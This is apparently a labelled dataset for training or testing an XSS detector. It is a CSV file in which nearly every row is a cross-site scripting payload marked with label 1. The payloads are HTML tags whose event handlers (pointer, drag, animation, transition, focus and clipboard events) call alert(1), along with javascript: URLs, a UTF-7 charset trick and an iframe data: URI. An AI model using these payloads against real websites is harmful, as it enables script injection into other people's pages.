Sentence,Label
<footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>,1
"<head onmousemove=""alert(1)"">test</head>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></code>",1
<svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>,1
"<template onbeforepaste=""alert(1)"" contenteditable>test</template>",1
"<style>:target {transform: rotate(180deg);}</style><audio id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></audio>",1
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dl>",1
"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",1
"<style>@keyframes slidein {}</style><hr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></hr>",1
"<style>@keyframes slidein {}</style><listing style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></listing>",1
"<datalist ondblclick=""alert(1)"">test</datalist>",1
"<bdo onmousedown=""alert(1)"">test</bdo>",1
"<dt draggable=""true"" ondrag=""alert(1)"">test</dt>",1
"<style>:target {transform: rotate(180deg);}</style><output id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></output>",1
"<form onclick=""alert(1)"">test</form>",1
"<div draggable=""true"" ondrag=""alert(1)"">test</div>",1
"<content onkeyup=""alert(1)"" contenteditable>test</content>",1
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationend=""alert(1)""></var>",1
"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>",1
"<title onmouseover=""alert(1)"">test</title>",1
"<div draggable=""true"" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>",1
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",1
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",1
"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>",1
"<option onkeypress=""alert(1)"" contenteditable>test</option>",1
"<IMG SRC=""javascript:alert('');"">",1
"<form draggable=""true"" ondragleave=""alert(1)"">test</form>",1
"<style>:target {color:red;}</style><article id=x style=""transition:color 1s"" ontransitionend=alert(1)></article>",1
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationstart=""alert(1)""></var>",1
<rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>,1
"<legend onkeydown=""alert(1)"" contenteditable>test</legend>",1
<menu id=x tabindex=1 onbeforeactivate=alert(1)></menu>,1
"<dd onmousemove=""alert(1)"">test</dd>",1
<span onpointerover=alert(1)>XSS</span>,1
<div id=x tabindex=1 onfocusin=alert(1)></div>,1
<em onpointermove=alert(1)>XSS</em>,1
<param onpointerover=alert(1)>XSS</param>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></menu>",1
"<style>:target {color: red;}</style><frame id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frame>",1
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,1
<template onpointerenter=alert(1)>XSS</template>,1
"<isindex onmousemove=""alert(1)"">test</isindex>",1
<svg onpointerout=alert(1)>XSS</svg>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rb>",1
<animate onpointerenter=alert(1)>XSS</animate>,1
"<style>:target {transform: rotate(180deg);}</style><form id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></form>",1
"<embed oncontextmenu=""alert(1)"">test</embed>",1
<ruby onpointerup=alert(1)>XSS</ruby>,1
<svg><animatetransform onbegin=alert(1) attributeName=transform>,1
"<style>:target {transform: rotate(180deg);}</style><bgsound id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bgsound>",1
"<div draggable=""true"" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>",1
<address id=x tabindex=1 onfocus=alert(1)></address>,1
<nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>,1
"<multicol onmousemove=""alert(1)"">test</multicol>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><base id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></base>",1
<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>,1
<menu onpointerup=alert(1)>XSS</menu>,1
"<label draggable=""true"" ondrag=""alert(1)"">test</label>",1
"<output onkeypress=""alert(1)"" contenteditable>test</output>",1
<thead onpointerdown=alert(1)>XSS</thead>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><listing id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></listing>",1
<svg><template onload=alert(1)></template>,1
"<figcaption onpaste=""alert(1)"" contenteditable>test</figcaption>",1
"<BR SIZE=""&{alert('')}"">",1
"<style>:target {transform: rotate(180deg);}</style><table id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></table>",1
"<isindex onbeforecut=""alert(1)"" contenteditable>test</isindex>",1
"<style>:target {transform: rotate(180deg);}</style><small id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></small>",1
"<cite onmousemove=""alert(1)"">test</cite>",1
<nextid onpointerout=alert(1)>XSS</nextid>,1
<meter onfocusout=alert(1) tabindex=1 id=x></meter><input autofocus>,1
"<menuitem oncut=""alert(1)"" contenteditable>test</menuitem>",1
"<style>:target {color:red;}</style><plaintext id=x style=""transition:color 1s"" ontransitionend=alert(1)></plaintext>",1
<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>,1
"<style>@keyframes x{}</style><noembed style=""animation-name:x"" onanimationstart=""alert(1)""></noembed>",1
<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>,1
"<em onmouseleave=""alert(1)"">test</em>",1
<html id=x tabindex=1 onbeforeactivate=alert(1)></html>,1
"<acronym draggable=""true"" ondragstart=""alert(1)"">test</acronym>",1
"<style>:target {transform: rotate(180deg);}</style><progress id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></progress>",1
<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>,1
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>",1
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationend=""alert(1)""></label>",1
"<del ondblclick=""alert(1)"">test</del>",1
"<style draggable=""true"" ondragenter=""alert(1)"">test</style>",1
<meter onpointerenter=alert(1)>XSS</meter>,1
"<br onmousemove=""alert(1)"">test</br>",1
"<style>:target {color: red;}</style><multicol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></multicol>",1
"<div draggable=""true"" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>",1
<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>,1
"<dt onkeyup=""alert(1)"" contenteditable>test</dt>",1
"<optgroup onclick=""alert(1)"">test</optgroup>",1
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",1
"<label oncontextmenu=""alert(1)"">test</label>",1
"<bdo onmousemove=""alert(1)"">test</bdo>",1
<map onpointerover=alert(1)>XSS</map>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></colgroup>",1
"<bdo onmouseenter=""alert(1)"">test</bdo>",1
"<dl onpaste=""alert(1)"" contenteditable>test</dl>",1
"<iframe/src=""data:text/html,<svg onload=alert(1)>"">",1
<area id=x tabindex=1 onbeforeactivate=alert(1)></area>,1
<acronym onpointerout=alert(1)>XSS</acronym>,1
<article id=x tabindex=1 onfocusin=alert(1)></article>,1
<html onpointerleave=alert(1)>XSS</html>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><th id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></th>",1
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",1
<dialog id=x tabindex=1 onbeforedeactivate=alert(1)></dialog><input autofocus>,1
"<details oncopy=""alert(1)"" contenteditable>test</details>",1
"<object onmouseup=""alert(1)"">test</object>",1
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",1
<hgroup id=x tabindex=1 onbeforeactivate=alert(1)></hgroup>,1
"<colgroup onkeydown=""alert(1)"" contenteditable>test</colgroup>",1
"<font onbeforecut=""alert(1)"" contenteditable>test</font>",1
"<time onmousedown=""alert(1)"">test</time>",1
<menuitem onpointerenter=alert(1)>XSS</menuitem>,1
<IMG SRC=javascript:alert(&quot;&quot;)>,1
<track id=x tabindex=1 onactivate=alert(1)></track>,1
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></plaintext>",1
"<s onmouseleave=""alert(1)"">test</s>",1
"<div draggable=""true"" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>",1
"<header oncut=""alert(1)"" contenteditable>test</header>",1
"<link oncopy=""alert(1)"" contenteditable>test</link>",1
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,1
"<keygen onkeydown=""alert(1)"" contenteditable>test</keygen>",1
<body onbeforeprint=alert(1)>,1
"<ol onclick=""alert(1)"">test</ol>",1
<select onfocusout=alert(1) id=x></select><input autofocus>,1
"<nextid onmousedown=""alert(1)"">test</nextid>",1
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('')",1
<tbody onpointermove=alert(1)>XSS</tbody>,1
<figcaption id=x tabindex=1 onbeforeactivate=alert(1)></figcaption>,1
"<IMG LOWSRC=""javascript:alert('')"">",1
<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>,1
"<dir onkeyup=""alert(1)"" contenteditable>test</dir>",1
<col id=x tabindex=1 onfocusin=alert(1)></col>,1
<pre onpointermove=alert(1)>XSS</pre>,1
"<col onmouseout=""alert(1)"">test</col>",1
"<html draggable=""true"" ondragleave=""alert(1)"">test</html>",1
<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>,1
"<style>:target {transform: rotate(180deg);}</style><rb id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rb>",1
"<style onmouseenter=""alert(1)"">test</style>",1
"<iframe onmouseover=""alert(1)"">test</iframe>",1
"<input draggable=""true"" ondragenter=""alert(1)"">test</input>",1
<output onpointerover=alert(1)>XSS</output>,1
<form id=x tabindex=1 onfocusin=alert(1)></form>,1
"<html draggable=""true"" ondragenter=""alert(1)"">test</html>",1
"<progress onkeydown=""alert(1)"" contenteditable>test</progress>",1
"<marquee onkeydown=""alert(1)"" contenteditable>test</marquee>",1
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionend=alert(1)></data>",1
<option onpointerdown=alert(1)>XSS</option>,1
"<html oncut=""alert(1)"" contenteditable>test</html>",1
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",1
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationstart=""alert(1)""></sub>",1
"<style>:target {color: red;}</style><ul id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ul>",1
"<command draggable=""true"" ondragenter=""alert(1)"">test</command>",1
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationend=""alert(1)""></noframes>",1
"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tbody>",1
<svg><mark onload=alert(1)></mark>,1
"<button onclick=""alert(1)"">test</button>",1
<sup onpointerout=alert(1)>XSS</sup>,1
<ins id=x tabindex=1 onbeforeactivate=alert(1)></ins>,1
"<tfoot onmouseup=""alert(1)"">test</tfoot>",1
<big onpointerdown=alert(1)>XSS</big>,1
"<style>:target {transform: rotate(180deg);}</style><thead id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></thead>",1
"<details onmousemove=""alert(1)"">test</details>",1
"<q draggable=""true"" ondrag=""alert(1)"">test</q>",1
"<div onmouseenter=""alert(1)"">test</div>",1
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></header>",1
"<li onkeypress=""alert(1)"" contenteditable>test</li>",1
<input id=x onfocusin=alert(1)>,1
"<ul draggable=""true"" ondragleave=""alert(1)"">test</ul>",1
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onanimationend=""alert(1)""></applet>",1
<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>,1
<td onpointerover=alert(1)>XSS</td>,1
"<time onmouseleave=""alert(1)"">test</time>",1
"<listing onbeforepaste=""alert(1)"" contenteditable>test</listing>",1
<dfn onpointerleave=alert(1)>XSS</dfn>,1
<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>,1
"<script onmouseup=""alert(1)"">test</script>",1
<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>,1
"<hr onkeydown=""alert(1)"" contenteditable>test</hr>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><picture id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></picture>",1
"<style>@keyframes slidein {}</style><audio style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></audio>",1
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,1
"<source onmouseout=""alert(1)"">test</source>",1
<tfoot onpointerover=alert(1)>XSS</tfoot>,1
"<p onmouseout=""alert(1)"">test</p>",1
<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>,1
<rp id=x tabindex=1 onfocusin=alert(1)></rp>,1
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationend=""alert(1)""></rt>",1
"<blink onmouseout=""alert(1)"">test</blink>",1
"<time draggable=""true"" ondragstart=""alert(1)"">test</time>",1
"<code onmousedown=""alert(1)"">test</code>",1
<content id=x tabindex=1 onfocus=alert(1)></content>,1
"<div draggable=""true"" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>",1
<svg><video onload=alert(1)></video>,1
<acronym onpointerdown=alert(1)>XSS</acronym>,1
<data id=x tabindex=1 onactivate=alert(1)></data>,1
"<br onbeforepaste=""alert(1)"" contenteditable>test</br>",1
"""><img src=""x:x"" onerror=""alert()"">",1
"<blockquote oncut=""alert(1)"" contenteditable>test</blockquote>",1
"<shadow draggable=""true"" ondragenter=""alert(1)"">test</shadow>",1
"<listing onkeyup=""alert(1)"" contenteditable>test</listing>",1
"<style>@keyframes x{}</style><head style=""animation-name:x"" onanimationend=""alert(1)""></head>",1
"<progress onmouseout=""alert(1)"">test</progress>",1
"<strike onmousemove=""alert(1)"">test</strike>",1
"<dt oncut=""alert(1)"" contenteditable>test</dt>",1
<svg><article onload=alert(1)></article>,1
"<rp oncopy=""alert(1)"" contenteditable>test</rp>",1
<dd onpointerleave=alert(1)>XSS</dd>,1
<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>,1
<label onblur=alert(1) tabindex=1 id=x></label><input autofocus>,1
<svg><optgroup onload=alert(1)></optgroup>,1
"<header draggable=""true"" ondragenter=""alert(1)"">test</header>",1
"<style>:target {color: red;}</style><rtc id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rtc>",1
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,1
"<A HREF=""//google""></A>",1
"<wbr ondblclick=""alert(1)"">test</wbr>",1
"<style>@keyframes slidein {}</style><command style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></command>",1
"<col onkeydown=""alert(1)"" contenteditable>test</col>",1
"<listing onbeforecopy=""alert(1)"" contenteditable>test</listing>",1
<font onfocusout=alert(1) tabindex=1 id=x></font><input autofocus>,1
"<ruby draggable=""true"" ondragend=""alert(1)"">test</ruby>",1
"<style>@keyframes slidein {}</style><time style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></time>",1
"<meter draggable=""true"" ondragleave=""alert(1)"">test</meter>",1
<col onpointerleave=alert(1)>XSS</col>,1
<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>,1
"<svg oncontextmenu=""alert(1)"">test</svg>",1
"<element onmousemove=""alert(1)"">test</element>",1
<tr id=x tabindex=1 onbeforedeactivate=alert(1)></tr><input autofocus>,1
0x42.0x0000066.0x7.0x93/,1
<summary id=x tabindex=1 onactivate=alert(1)></summary>,1
<content id=x tabindex=1 onactivate=alert(1)></content>,1
"<bdo onbeforecopy=""alert(1)"" contenteditable>test</bdo>",1
"<div draggable=""true"" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable>drop here</shadow>",1
"<ul onmouseleave=""alert(1)"">test</ul>",1
<svg><fieldset onload=alert(1)></fieldset>,1
"<big onmouseleave=""alert(1)"">test</big>",1
<bdi onpointerenter=alert(1)>XSS</bdi>,1
<meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>,1
"<i onkeyup=""alert(1)"" contenteditable>test</i>",1
"<style>:target {color: red;}</style><nextid id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nextid>",1
